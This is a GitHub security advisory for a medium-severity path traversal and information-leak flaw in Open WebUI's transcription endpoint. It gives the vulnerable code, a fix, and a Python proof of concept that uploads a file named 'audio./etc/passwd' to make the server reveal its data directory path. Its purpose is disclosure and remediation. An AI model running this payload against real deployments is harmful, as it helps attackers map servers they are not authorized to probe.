# [M] Open WebUI vulnerable to Path Traversal in `POST /api/v1/audio/transcriptions`

## Summary
Severity: Medium
Advisory: GHSA-vvxm-vxmr-624h
CVE: CVE-2026-28786
CWE: CWE-209, CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-vvxm-vxmr-624h
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.8.6

## Details
### Summary

An unsanitised filename field in the speech-to-text transcription endpoint allows any authenticated non-admin user to trigger a `FileNotFoundError` whose message — including the server's absolute `DATA_DIR` path — is returned verbatim in the HTTP 400 response body, confirming information disclosure on all default deployments.

### Details

`backend/open_webui/routers/audio.py:1197` extracts a file extension from the raw multipart `filename` using `file.filename.split(".")[-1]` with no path sanitisation. The result is concatenated into a filesystem path and passed to `open()`:

```python
ext       = file.filename.split(".")[-1]       # attacker-controlled, no sanitisation
filename  = f"{id}.{ext}"                      # may contain "/"
file_path = f"{file_dir}/{filename}"
with open(file_path, "wb") as f:
    f.write(contents)
```

If the filename is `audio./etc/passwd`, `split(".")[-1]` yields `/etc/passwd` and the assembled path becomes:

```
{CACHE_DIR}/audio/transcriptions/{uuid}./etc/passwd
```

`open()` fails with `FileNotFoundError`. The outer `except` block at line 1231 returns the exception via `ERROR_MESSAGES.DEFAULT(e)`, leaking the full absolute path in the response body.

The MIME-type guard at line 1190 checks `Content-Type` (a separate multipart field) and does not constrain `filename`. Setting `Content-Type: audio/wav` satisfies the guard regardless of the filename value.

This handler is the only file upload path in the codebase that omits `os.path.basename()`. Both sibling handlers apply it explicitly:

```python
# files.py:244
filename = os.path.basename(file.filename)

# pipelines.py:206
filename = os.path.basename(file.filename)
```

**Recommended fix** — match the existing pattern and suppress path leakage in errors:

```python
# audio.py:1197 — sanitise extension
from pathlib import Path
safe_name = Path(file.filename).name
ext = Path(safe_name).suffix.lstrip(".") or "bin"

# audio.py:1231 — suppress internal path in error response
except Exception as e:
    log.exception(e)
    raise HTTPException(status_code=400, detail="Transcription failed.")
```

---

### PoC

**Requirements:** a running Open WebUI instance and one standard (non-admin) user account.

```bash
docker run -d -p 3000:8080 --name owui-test ghcr.io/open-webui/open-webui:latest
# wait ~30 s, register a standard user at http://localhost:3000
pip install requests
```

```python
import requests, sys

BASE_URL = "http://localhost:3000"
EMAIL    = "user@example.com"
PASSWORD = "changeme"

token = requests.post(f"{BASE_URL}/api/v1/auths/signin",
                      json={"email": EMAIL, "password": PASSWORD},
                      timeout=10).json()["token"]

boundary = "----Boundary"
wav_stub = b"RIFF\x00\x00\x00\x00WAVE"
body = (
    f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
    f'filename="audio./etc/passwd"\r\nContent-Type: audio/wav\r\n\r\n'
).encode() + wav_stub + f"\r\n--{boundary}--\r\n".encode()

resp = requests.post(
    f"{BASE_URL}/api/v1/audio/transcriptions",
    data=body,
    headers={"Authorization": f"Bearer {token}",
             "Content-Type": f"multipart/form-data; boundary={boundary}"},
    timeout=15,
)
print(resp.status_code, resp.text)
```

**Observed output (live test, commit `b8112d72b`):**

```
400 {"detail":"[ERROR: [Errno 2] No such file or directory:
'/app/backend/data/cache/audio/transcriptions/59457ccf-…./etc/passwd']"}
```

The absolute `DATA_DIR` path is confirmed. Filesystem structure can be enumerated by varying traversal depth and observing which error messages change.

**Note on the write primitive:** the traversal path includes a fresh UUID segment (`{uuid}.`) that never pre-exists as a directory, so `open()` is OS-blocked in all practical scenarios. The impact is information disclosure only.

---

### Impact
Any authenticated, non-admin user on a default Open WebUI deployment can leak the server's absolute `DATA_DIR` filesystem path. The route is gated by `get_verified_user` — the lowest privilege tier — so every registered account is a potential attacker. Multi-tenant and shared deployments are most exposed.

> **AI Disclosure:** Claude was used to draft this report and the PoC. The vulnerability was identified via manual static analysis of commit `b8112d72b`. All code references were verified by the reporter, who accepts full responsibility for accuracy.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h
- https://nvd.nist.gov/vuln/detail/CVE-2026-28786
- https://github.com/open-webui/open-webui/commit/387225eb8b3906909436004f84fff1b012e067d4
- https://github.com/open-webui/open-webui
